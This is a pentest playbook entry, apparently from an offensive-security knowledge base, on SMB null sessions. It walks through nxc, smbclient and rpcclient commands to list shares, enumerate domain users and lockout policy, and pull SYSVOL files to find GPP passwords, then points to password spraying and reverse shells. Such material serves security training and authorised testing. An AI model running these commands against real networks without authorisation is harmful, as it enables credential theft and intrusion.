---
id: null-session
title: SMB Null Session
stage: initial-access
tags: [windows, smb]
summary: Access SMB shares and RPC endpoints without any credentials — leaks users, groups, password policies, and SYSVOL contents.
leads_to:
  - rev-shell
  - password-spray
  - windows-gpp-creds
  - kerberoast
  - asreproast
---

## Prerequisites

Port 445 open. Null sessions are allowed by default on older Windows versions and many exam environments. Try before assuming you need credentials.

A null session authenticates to SMB with an empty username and password. On misconfigured systems, this grants access to share listings, RPC user/group enumeration, and the SYSVOL share. SYSVOL access is particularly valuable because Group Policy Preference XML files stored there may contain encrypted passwords — and the encryption key is public knowledge (MS14-025).

## Quick Win

> List shares as null user — no credentials, immediate visibility into what's exposed.

```bash
nxc smb $TARGET -u '' -p '' --shares
smbclient -L //$TARGET/ -U '' -N
```

## RPC Null Session — User and Policy Enumeration

> Extract users, groups, and the lockout policy — everything you need before spraying.

```bash
rpcclient -U "" -N $TARGET
> enumdomusers    # full user list
> enumdomgroups   # group memberships
> getdompwinfo    # password policy — check lockout threshold before spraying
```

## Download Share Contents

> Pull everything readable — configs, scripts, and GPP XML files.

```bash
smbclient //$TARGET/SYSVOL -U '' -N
> recurse ON
> ls
> mget *
# Find cpassword in XML: grep -r cpassword . → leads to windows-gpp-creds
```

## Leads To

User list obtained → password-spray. SYSVOL readable → windows-gpp-creds (search for `cpassword` in Group Policy XML files). Share with sensitive files → credentials or SSH keys → rev-shell or direct auth. Password policy lockout = 0 → spray aggressively.
